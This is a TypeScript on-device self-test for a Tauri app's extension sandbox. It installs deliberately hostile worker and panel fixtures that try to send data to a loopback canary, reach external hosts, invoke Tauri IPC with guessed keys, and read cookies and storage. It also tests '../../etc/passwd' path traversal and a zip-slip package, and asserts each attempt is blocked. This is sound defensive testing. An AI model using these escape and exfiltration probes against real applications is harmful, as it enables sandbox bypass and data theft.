// On-device verification of the extension host (roadmap M3 step 8). Runs only when the app finds a file named
// `selftest` in its data folder (see `selftest_enabled` in src-tauri); each result goes to the app's log through
// `selftest_report`. It exercises the real webview: workers, CSP, the alstext:// protocol, install, timeouts.
// Not part of normal use.

import { invoke } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";
import { api } from "../api";
import { extHost, extUrl, readerBridge } from "./index";
import type { CoreEvent, ExtInfo, ResolvedView } from "./types";

const report = (name: string, ok: boolean, detail = "") => invoke("selftest_report", { name, ok, detail: String(detail).slice(0, 600) });

async function check(name: string, fn: () => Promise<string | void>) {
  try {
    const detail = await fn();
    await report(name, true, detail ?? "");
  } catch (e) {
    await report(name, false, e instanceof Error ? e.message : String(e));
  }
}

function assert(cond: unknown, msg: string): asserts cond {
  if (!cond) throw new Error(msg);
}

// ---- minimal "stored" zip writer, enough to build .alext fixtures ---------------------------------------------

const crcTable = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});
const crc32 = (b: Uint8Array) => {
  let c = 0xffffffff;
  for (const x of b) c = crcTable[(c ^ x) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
};

export function makeZip(files: Record<string, string | Uint8Array>): File {
  const enc = new TextEncoder();
  const parts: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  let offset = 0;
  const u16 = (v: number) => [v & 255, (v >> 8) & 255];
  const u32 = (v: number) => [v & 255, (v >> 8) & 255, (v >> 16) & 255, (v >>> 24) & 255];
  for (const [name, content] of Object.entries(files)) {
    const nameBytes = enc.encode(name);
    const data = typeof content === "string" ? enc.encode(content) : content;
    const crc = crc32(data);
    const header = Uint8Array.from([
      ...u32(0x04034b50), ...u16(20), ...u16(0), ...u16(0), ...u16(0), ...u16(0x21),
      ...u32(crc), ...u32(data.length), ...u32(data.length), ...u16(nameBytes.length), ...u16(0),
    ]);
    parts.push(header, nameBytes, data);
    central.push(
      Uint8Array.from([
        ...u32(0x02014b50), ...u16(20), ...u16(20), ...u16(0), ...u16(0), ...u16(0), ...u16(0x21),
        ...u32(crc), ...u32(data.length), ...u32(data.length), ...u16(nameBytes.length),
        ...u16(0), ...u16(0), ...u16(0), ...u16(0), ...u32(0), ...u32(offset),
      ]),
      nameBytes,
    );
    offset += header.length + nameBytes.length + data.length;
  }
  const cdSize = central.reduce((n, p) => n + p.length, 0);
  const eocd = Uint8Array.from([
    ...u32(0x06054b50), ...u16(0), ...u16(0), ...u16(Object.keys(files).length), ...u16(Object.keys(files).length),
    ...u32(cdSize), ...u32(offset), ...u16(0),
  ]);
  return new File([...parts, ...central, eocd] as BlobPart[], "fixture.alext");
}

const manifest = (id: string, extra: Record<string, unknown> = {}) =>
  JSON.stringify({
    id, name: id, version: "1.0.0", kind: "addon", license: "MIT", apiVersion: "^1.0", targets: ["*"],
    runtime: { type: "js", entry: "main.js" }, ...extra,
  });

// ---- fixtures ---------------------------------------------------------------------------------------------------

const SLOW_JS = `export function annotate() { return new Promise(() => {}); }`;

const EVIL_JS = `
const violations = [];
self.addEventListener("securitypolicyviolation", (e) => violations.push(e.violatedDirective + " " + e.blockedURI));
const withTimeout = (p) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error("probe timed out (no answer)")), 3000))]);
const attempt = async (f) => { try { const r = await withTimeout(Promise.resolve().then(f)); return { reached: true, detail: String(r) }; } catch (e) { return { reached: false, detail: String(e && e.message || e) }; } };
const ipcUrl = (cmd) => /Windows|Android/i.test(navigator.userAgent) ? "http://ipc.localhost/" + cmd : "ipc://localhost/" + cmd;
export const commands = {
  async probe(args) {
    const out = {};
    const canary = args.canary;
    out.canaryFetch = await attempt(() => fetch(canary));
    out.canaryFetchNoCors = await attempt(() => fetch(canary, { mode: "no-cors", method: "POST", body: "stolen" }));
    out.canaryWebSocket = await attempt(() => new Promise((res, rej) => { const w = new WebSocket(canary.replace("http", "ws")); w.onopen = () => res("open"); w.onerror = () => rej(new Error("ws blocked")); }));
    out.canaryImport = await attempt(() => import(canary + "x.js"));
    out.canaryXhr = await attempt(() => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", canary); x.onload = () => res("loaded"); x.onerror = () => rej(new Error("xhr blocked")); x.send(); }));
    out.tauriInternals = typeof self.__TAURI_INTERNALS__ + "/" + typeof self.__TAURI__ + "/" + typeof self.__TAURI_INVOKE_KEY__;
    out.fetchExternal = await attempt(() => fetch("https://example.com/"));
    out.fetchExternalNoCors = await attempt(() => fetch("https://example.com/", { mode: "no-cors" }));
    out.importExternal = await attempt(() => import("https://example.com/x.js"));
    out.websocket = await attempt(() => new Promise((res, rej) => { const w = new WebSocket("wss://example.com/"); w.onopen = () => res("open"); w.onerror = () => rej(new Error("ws blocked")); }));
    out.xhr = await attempt(() => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", "https://example.com/"); x.onload = () => res("loaded"); x.onerror = () => rej(new Error("xhr blocked")); x.send(); }));
    const ipc = async (cmd, headers) => {
      const r = await fetch(ipcUrl(cmd), { method: "POST", headers: { "Content-Type": "application/json", ...headers }, body: "{}" });
      return r.status + " " + (await r.text()).slice(0, 120);
    };
    out.ipcNoKey = await attempt(() => ipc("list_works", {}));
    out.ipcFakeKey = await attempt(() => ipc("list_works", { "Tauri-Callback": "1", "Tauri-Error": "2", "Tauri-Invoke-Key": "guess" }));
    out.ipcExtCall = await attempt(() => ipc("ext_call", { "Tauri-Callback": "1", "Tauri-Error": "2", "Tauri-Invoke-Key": "guess" }));
    out.hostNetNoPerm = await attempt(() => alst.net.fetch("https://example.com/"));
    out.hostTermsNoPerm = await attempt(() => alst.terms.get({ language: "es", texts: ["hola"] }));
    out.hostEventsNoPerm = await attempt(() => alst.events.query({ type: "part.read" }));
    out.hostDictNoPerm = await attempt(() => alst.dict.lookup("es", "hola"));
    out.violations = violations;
    return out;
  },
};
`;

const EVIL_PANEL = `<!doctype html><meta charset="utf-8"><body>evil<script type="module">
import { alst } from "./panel.js";
const attempt = async (f) => { try { const r = await f(); return "reached:" + String(r); } catch (e) { return "blocked:" + String(e && e.message || e); } };
const out = {};
const viol = [];
document.addEventListener("securitypolicyviolation", (e) => viol.push(e.violatedDirective));
out.parentInternals = await attempt(() => parent.__TAURI_INTERNALS__ !== undefined);
out.topLocation = await attempt(() => top.location.href);
out.ownInternals = typeof window.__TAURI_INTERNALS__;
const tmo = (p) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error("no answer")), 3000))]);
out.invokeList = await attempt(async () => JSON.stringify(await tmo(window.__TAURI_INTERNALS__.invoke("list_works"))).slice(0, 80));
out.invokeExt = await attempt(async () => JSON.stringify(await tmo(window.__TAURI_INTERNALS__.invoke("ext_call", { extId: "addon.density", method: "storage.keys", params: {} }))).slice(0, 80));
out.invokeKeyVisible = await attempt(() => Object.keys(window.__TAURI_INTERNALS__).join(",") + " key:" + typeof window.__TAURI_INVOKE_KEY__);
const canary = new URLSearchParams(location.search).get("canary");
out.canaryFetch = await attempt(() => fetch(canary, { mode: "no-cors" }));
out.canaryImage = await attempt(() => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = () => rej(new Error("img blocked")); i.src = canary + "p.png"; }));
out.canaryForm = await attempt(() => { const f = document.createElement("form"); f.action = canary; document.body.append(f); f.submit(); return "submitted"; });
out.fetchExternal = await attempt(() => fetch("https://example.com/"));
out.fetchIpc = await attempt(async () => (await fetch("ipc://localhost/list_works", { method: "POST", body: "{}" })).status);
out.fetchIpcHttp = await attempt(async () => (await fetch("http://ipc.localhost/list_works", { method: "POST", body: "{}" })).status);
out.cookie = await attempt(() => document.cookie);
out.storage = await attempt(() => localStorage.length);
out.hostTermsNoPerm = await attempt(() => alst.call("terms.get", { language: "es", texts: ["hola"] }));
await new Promise((r) => setTimeout(r, 300));
out.violations = viol;
await alst.call("events.emit", { type: "panelprobe", payload: out });
</script>`;

// ---- the run ------------------------------------------------------------------------------------------------------

export async function run(
  languages: { id: string }[],
  after: string,
  ui: { openPart(id: string): void; showExtensions(): void },
) {
  await report("selftest-start", true, navigator.userAgent);
  const es = languages.find((l) => l.id === "es");
  if (!es) return report("languages", false, "no Spanish language");

  const events: CoreEvent[] = [];
  const unlisten = await listen<CoreEvent>("alst:event", (e) => events.push(e.payload));

  let resolved!: ResolvedView;
  let partId = "";

  await check("resolve: bundled extensions are active for es", async () => {
    resolved = await api.resolveExtensions("es");
    const ids = resolved.active.map((e) => e.id);
    assert(ids.includes("lang.es") && ids.includes("es.morph-hints") && ids.includes("addon.density"), `active = ${ids}`);
    assert(resolved.annotatorOrder.indexOf("es.morph-hints") >= 0, "morph-hints is an annotator");
    return ids.join(",") + " fp=" + resolved.fingerprint;
  });

  await check("alstext:// serves files with the right types and CORS", async () => {
    const wasm = await fetch(extUrl("es.morph-hints", "ext.wasm"));
    assert(wasm.ok, `ext.wasm HTTP ${wasm.status}`);
    assert(wasm.headers.get("content-type") === "application/wasm", `wasm type ${wasm.headers.get("content-type")}`);
    const bad = await fetch(extUrl("es.morph-hints", "../../etc/passwd")).catch(() => null);
    assert(!bad || !bad.ok, "path traversal must not be served");
    const html = await fetch(extUrl("addon.density", "panel.html"));
    assert(html.ok && (html.headers.get("content-type") ?? "").startsWith("text/html"), "panel html is served as html");
    return `wasm ${wasm.headers.get("content-type")}, html ${html.headers.get("content-type")}`;
  });

  await check("create a Spanish text", async () => {
    const w = await api.createWork("es", "Selftest", "Estoy corriendo rápidamente. Quiero hablar con ella. Ha comido mucho. La mujer lee.");
    partId = (await api.parts(w.id))[0].id;
  });

  await check("reader pipeline: WASM annotator + decorator in a worker", async () => {
    const v = await api.partView(partId);
    const tokens = await extHost.annotate(partId, "es", v.tokens, resolved);
    const kinds = tokens.filter((t) => t.ann["es.morph"]).map((t) => `${t.text}:${t.ann["es.morph"]}`);
    assert(kinds.includes("corriendo:gerund") && kinds.includes("rápidamente:adverb") && kinds.includes("hablar:infinitive"), kinds.join(","));
    assert(!kinds.some((k) => k.startsWith("mujer")), "mujer is not a verb");
    const hints = await extHost.decorate("es", v.units, tokens, resolved);
    const i = v.units.findIndex((u) => u.text === "corriendo");
    assert(hints[i]?.underline?.role === "verb" && hints[i].tooltip === "gerund", JSON.stringify(hints[i]));
    return kinds.join(", ");
  });

  await check("settings change the decorator output; defaults come from the schema", async () => {
    const e = resolved.active.find((x) => x.id === "es.morph-hints")!;
    assert(e.settings.gerunds === true, "default gerunds=true");
    await api.setExtensionSettings(e.id, { gerunds: false });
    const r2 = await api.resolveExtensions("es");
    assert(r2.fingerprint !== resolved.fingerprint, "fingerprint changes with settings");
    const v = await api.partView(partId);
    const tokens = await extHost.annotate(partId, "es", v.tokens, r2);
    const hints = await extHost.decorate("es", v.units, tokens, r2);
    const i = v.units.findIndex((u) => u.text === "corriendo");
    assert(!hints[i]?.underline, "gerund hint is off");
    const j = v.units.findIndex((u) => u.text === "hablar");
    assert(hints[j]?.underline, "infinitive still on");
    await api.setExtensionSettings(e.id, { gerunds: true });
    resolved = await api.resolveExtensions("es");
    let rejected = false;
    await api.setExtensionSettings(e.id, { nonsense: 1 }).catch(() => (rejected = true));
    assert(rejected, "invalid settings are rejected");
  });

  await check("density add-on: stats from decorate, via panelMessage", async () => {
    const d = resolved.active.find((x) => x.id === "addon.density")!;
    const v = await api.partView(partId);
    const tokens = await extHost.annotate(partId, "es", v.tokens, resolved);
    await extHost.decorate("es", v.units, tokens, resolved);
    const stats = (await extHost.panelMessage(d, "es", "density", { type: "stats" })) as { unknown: number; total: number; top: unknown[] };
    assert(stats && stats.unknown > 5 && stats.total > 10 && stats.top.length > 0, JSON.stringify(stats));
    return `unknown ${stats.unknown}/${stats.total}`;
  });

  await check("core events reach the density worker (part.read → storage history)", async () => {
    const d = resolved.active.find((x) => x.id === "addon.density")!;
    await api.finishPart(partId, false, 1234);
    await new Promise((r) => setTimeout(r, 600));
    assert(events.some((e) => e.type === "part.read"), "UI received part.read");
    const stats = (await extHost.panelMessage(d, "es", "density", { type: "stats" })) as { history: { unknown: number }[] };
    assert(stats.history.length >= 1, `history = ${JSON.stringify(stats.history)}`);
  });

  await check("host API permissions: density may read terms but not write them", async () => {
    let denied = "";
    try {
      await api.extCall("addon.density", "terms.update", { id: "x", patch: { status: 3 } });
    } catch (e) {
      denied = String(e);
    }
    assert(denied.includes("permission denied"), `terms.update: ${denied}`);
    await api.extCall("addon.density", "terms.search", { language: "es", query: "" });
    let net = "";
    try {
      await api.extCall("addon.density", "net.fetch", { url: "https://example.com/" });
    } catch (e) {
      net = String(e);
    }
    assert(net.includes("permission denied"), `net.fetch: ${net}`);
  });

  await check("disable/enable terminates and restarts the worker", async () => {
    await api.setExtensionEnabled("es.morph-hints", false);
    extHost.terminate("es.morph-hints");
    const off = await api.resolveExtensions("es");
    assert(!off.active.some((e) => e.id === "es.morph-hints"), "disabled extension is not active");
    await api.setExtensionEnabled("es.morph-hints", true);
    resolved = await api.resolveExtensions("es");
    const v = await api.partView(partId);
    const tokens = await extHost.annotate(partId, "es", v.tokens, resolved);
    assert(tokens.some((t) => t.ann["es.morph"]), "annotations are back after re-enable");
  });

  await check("install a zipped copy of addon-density as .alext (with permission preview)", async () => {
    const files: Record<string, string | Uint8Array> = {};
    const base = JSON.parse(await (await fetch(extUrl("addon.density", "extension.json"))).text());
    base.id = "addon.density-copy";
    base.name = "Density (installed copy)";
    files["extension.json"] = JSON.stringify(base);
    for (const f of ["main.js", "panel.html", "panel.js", "LICENSE"]) files[f] = new Uint8Array(await (await fetch(extUrl("addon.density", f))).arrayBuffer());
    const pkg = makeZip(files);
    const info = await api.inspectExtension(pkg);
    assert(info.permissions.map((p) => p.id).join() === "events:read,terms:read", `permissions ${info.permissions.map((p) => p.id)}`);
    assert(info.existingVersion === null, "not installed yet");
    await api.installExtension(pkg);
    const list = await api.extensions();
    const inst = list.extensions.find((e) => e.id === "addon.density-copy");
    assert(inst?.source === "installed" && inst.enabled, "installed and enabled");
    const r = await api.resolveExtensions("es");
    assert(r.active.some((e) => e.id === "addon.density-copy"), "active after install");
    const copy = await fetch(extUrl("addon.density-copy", "panel.html"));
    assert(copy.ok, "installed files are served");
    // Disable-then-uninstall keeps the settings row but removes the folder.
    await api.uninstallExtension("addon.density-copy");
    const after = await api.extensions();
    assert(!after.extensions.some((e) => e.id === "addon.density-copy"), "gone after uninstall");
    let bundledRefused = "";
    await api.uninstallExtension("addon.density").catch((e) => (bundledRefused = String(e)));
    assert(bundledRefused.includes("bundled"), "bundled can't be uninstalled");
  });

  await check("install rejects a zip-slip package", async () => {
    const evil = makeZip({ "extension.json": manifest("test.zipslip"), "main.js": "", "../evil.js": "x" });
    let msg = "";
    await api.inspectExtension(evil).catch((e) => (msg = String(e)));
    assert(msg.includes("unsafe path"), `message: ${msg}`);
  });

  await check("a deliberately slow extension times out cleanly", async () => {
    await api.installExtension(makeZip({ "extension.json": manifest("test.slow", { provides: ["es.slow"] }), "main.js": SLOW_JS, LICENSE: "MIT" }));
    const r = await api.resolveExtensions("es");
    const v = await api.partView(partId);
    const t0 = Date.now();
    const tokens = await extHost.annotate("slow-run", "es", v.tokens, r);
    const ms = Date.now() - t0;
    assert(ms >= 1900 && ms < 4500, `took ${ms} ms`);
    assert(extHost.status("test.slow") === "errored", `status ${extHost.status("test.slow")}`);
    assert(tokens.some((t) => t.ann["es.morph"]), "other extensions still annotated the part");
    assert(extHost.error("test.slow")!.message.includes("timed out after 2s"), extHost.error("test.slow")!.message);
    await api.uninstallExtension("test.slow");
    extHost.clearError("test.slow");
    return `${ms} ms: ${extHost.error("test.slow")?.message ?? "cleared"}`;
  });

  await check("SANDBOX: a hostile worker cannot reach the network or Tauri commands", async () => {
    await api.installExtension(makeZip({ "extension.json": manifest("test.evil", { contributes: { commands: [{ id: "probe", title: "Probe" }] } }), "main.js": EVIL_JS, LICENSE: "MIT" }));
    const r = await api.resolveExtensions("es");
    const info = r.active.find((e) => e.id === "test.evil") as ExtInfo;
    assert(info, "evil extension is active");
    const port = await invoke<number>("selftest_canary_start");
    const out = (await extHost.runCommand(info, "es", "probe", { canary: `http://127.0.0.1:${port}/` })) as Record<string, { reached: boolean; detail: string } | string | string[]>;
    await report("SANDBOX probe results", true, JSON.stringify(out));
    const reached = (k: string) => (out[k] as { reached: boolean }).reached;
    assert(out.tauriInternals === "undefined/undefined/undefined", `Tauri globals visible in worker: ${out.tauriInternals}`);
    for (const k of ["fetchExternal", "importExternal", "websocket", "xhr"]) assert(!reached(k), `${k} reached the network: ${JSON.stringify(out[k])}`);
    for (const k of ["canaryFetch", "canaryFetchNoCors", "canaryWebSocket", "canaryImport", "canaryXhr"]) assert(!reached(k), `${k} reached the loopback canary: ${JSON.stringify(out[k])}`);
    const hits = await invoke<number>("selftest_canary_hits");
    assert(hits === 0, `the worker connected to the loopback canary ${hits} time(s): CSP is not applied to workers`);
    for (const k of ["ipcNoKey", "ipcFakeKey", "ipcExtCall"]) {
      const o = out[k] as { reached: boolean; detail: string };
      assert(!(o.reached && /^2\d\d /.test(o.detail)), `direct IPC call succeeded (${k}): ${o.detail}`);
    }
    for (const k of ["hostNetNoPerm", "hostTermsNoPerm", "hostEventsNoPerm", "hostDictNoPerm"]) {
      const o = out[k] as { reached: boolean; detail: string };
      assert(!o.reached && /permission denied/.test(o.detail), `${k}: ${JSON.stringify(o)}`);
    }
    await api.uninstallExtension("test.evil");
    extHost.terminate("test.evil");
  });

  await check("SANDBOX: a hostile panel (sandboxed iframe) cannot reach the app or network", async () => {
    await api.installExtension(
      makeZip({
        "extension.json": manifest("test.evilpanel", { contributes: { panels: [{ id: "p", title: "P", entry: "panel.html" }] } }),
        "main.js": "export const x = 1;",
        "panel.html": EVIL_PANEL,
        "panel.js": await (await fetch(extUrl("addon.density", "panel.js"))).text(),
        LICENSE: "MIT",
      }),
    );
    // Host the panel the way PanelHost does: sandbox="allow-scripts", relay messages for this frame only.
    const frame = document.createElement("iframe");
    frame.setAttribute("sandbox", "allow-scripts");
    frame.style.cssText = "position:fixed;left:-9999px;width:200px;height:100px";
    const port = await invoke<number>("selftest_canary_start");
    frame.src = extUrl("test.evilpanel", "panel.html") + `?canary=${encodeURIComponent(`http://127.0.0.1:${port}/`)}`;
    const info = (await api.resolveExtensions("es")).active.find((e) => e.id === "test.evilpanel")!;
    const onMsg = async (e: MessageEvent) => {
      if (e.source !== frame.contentWindow || e.data?.type !== "alst-call") return;
      try {
        const result = await extHost.serveApi(info, `alst.${e.data.method}`, e.data.params);
        frame.contentWindow!.postMessage({ type: "alst-result", id: e.data.id, result: result ?? null }, "*");
      } catch (err) {
        frame.contentWindow!.postMessage({ type: "alst-result", id: e.data.id, error: { message: String(err) } }, "*");
      }
    };
    window.addEventListener("message", onMsg);
    document.body.appendChild(frame);
    let probe: Record<string, unknown> | undefined;
    for (let i = 0; i < 40 && !probe; i++) {
      await new Promise((r) => setTimeout(r, 250));
      const evs = (await api.extCall("test.evilpanel", "events.query", { type: "test.evilpanel/panelprobe" })) as { payload: Record<string, unknown> }[];
      probe = evs[0]?.payload;
    }
    window.removeEventListener("message", onMsg);
    frame.remove();
    assert(probe, "panel never reported (did it load? does the CSP block its own module script?)");
    await report("SANDBOX panel probe results", true, JSON.stringify(probe));
    const s = (k: string) => String(probe![k]);
    assert(s("parentInternals").startsWith("blocked"), `parent internals: ${s("parentInternals")}`);
    assert(s("topLocation").startsWith("blocked"), `top.location: ${s("topLocation")}`);
    for (const k of ["invokeList", "invokeExt"]) assert(s(k).startsWith("blocked"), `panel could invoke commands (${k}): ${s(k)}`);
    for (const k of ["fetchExternal", "fetchIpc", "fetchIpcHttp", "canaryFetch", "canaryImage"]) assert(s(k).startsWith("blocked"), `${k}: ${s(k)}`);
    const panelHits = await invoke<number>("selftest_canary_hits");
    assert(panelHits === 0, `the panel connected to the loopback canary ${panelHits} time(s)`);
    assert(s("hostTermsNoPerm").includes("denied"), `panel relay ignores missing permission: ${s("hostTermsNoPerm")}`);
    await api.uninstallExtension("test.evilpanel");
  });

  // Direct, deliberate positive control: the main window itself can invoke commands.
  await check("control: the main window can invoke commands", async () => {
    const works = await api.works();
    assert(Array.isArray(works), "list_works");
  });

  unlisten();
  await report("selftest-done", true);

  // Leave something on screen for screenshots: "reader" opens the part with the density panel, "extensions" the screen.
  if (after === "reader") {
    ui.openPart(partId);
    await new Promise((r) => setTimeout(r, 2500));
    readerBridge.openPanel("addon.density", "density");
  } else if (after === "extensions") {
    ui.showExtensions();
  }
}
